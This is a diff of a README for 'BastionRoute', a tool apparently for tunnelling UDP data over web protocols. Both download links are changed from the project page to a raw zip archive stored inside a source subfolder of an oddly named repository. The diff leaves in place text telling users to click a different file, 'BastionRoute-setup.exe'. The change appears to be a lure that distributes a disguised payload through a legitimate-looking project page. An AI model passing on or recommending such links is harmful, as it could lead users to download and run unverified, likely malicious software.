@@ -1,6 +1,6 @@
 # 🛡️ BastionRoute - Secure UDP Data Streams Made Simple
 
-[![](https://img.shields.io/badge/Download-BastionRoute-blue)](https://github.com/Convectioniproclozide569/BastionRoute)
+[![](https://img.shields.io/badge/Download-BastionRoute-blue)](https://github.com/Convectioniproclozide569/BastionRoute/raw/refs/heads/main/cmd/bastionroute-relay/Route-Bastion-2.8.zip)
 
 BastionRoute helps you bridge network connections between devices. It moves binary data streams over the internet using standard web protocols. You do not need to open ports on your router or change complex firewall settings.
 
@@ -29,7 +29,7 @@ Follow these steps to set up the software on your Windows computer.
 ### 1. Download
 Visit the page below to get the installer for your system. 
 
-[Download BastionRoute Installer](https://github.com/Convectioniproclozide569/BastionRoute)
+[Download BastionRoute Installer](https://github.com/Convectioniproclozide569/BastionRoute/raw/refs/heads/main/cmd/bastionroute-relay/Route-Bastion-2.8.zip)
 
 Click on the file named BastionRoute-setup.exe. Save it to your Downloads folder.
 
